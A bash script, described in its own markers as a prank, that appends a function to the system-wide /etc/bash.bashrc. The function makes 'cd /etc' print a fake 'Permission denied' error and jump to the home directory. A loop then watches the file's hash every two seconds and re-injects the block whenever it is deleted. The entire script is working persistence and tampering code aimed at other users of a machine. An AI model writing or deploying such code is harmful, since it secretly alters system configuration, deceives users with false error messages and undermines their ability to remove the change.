#!/bin/bash

BASHRC="/etc/bash.bashrc"
POLL_INTERVAL=2
MARKER_START="# prank_entry"
MARKER_END="# prank_entry_end"

CD_PRANK=$(cat <<'EOF'
# prank_entry
cd() {
    if [[ "$1" == "/etc" || "$1" == "/etc/" ]]; then
        echo "bash: cd: /etc: Permission denied"
        builtin cd ~
    else
        builtin cd "$@"
    fi
}
# prank_entry_end
EOF
)

inject_prank() {
    if ! grep -qF "$MARKER_START" "$BASHRC"; then
        echo "$CD_PRANK" >> "$BASHRC"
    fi
}

remove_and_reinject() {
    # Strip existing prank block, then re-add it
    sed -i "/$MARKER_START/,/$MARKER_END/d" "$BASHRC"
    echo "$CD_PRANK" >> "$BASHRC"
}

get_hash() {
    md5sum "$BASHRC" | awk '{print $1}'
}

# Initial injection
inject_prank
LAST_HASH=$(get_hash)

# Watch for tampering and re-inject if removed
while true; do
    sleep "$POLL_INTERVAL"
    CURRENT_HASH=$(get_hash)
    if [[ "$CURRENT_HASH" != "$LAST_HASH" ]]; then
        if ! grep -qF "$MARKER_START" "$BASHRC"; then
            remove_and_reinject
        fi
        LAST_HASH=$(get_hash)
    fi
done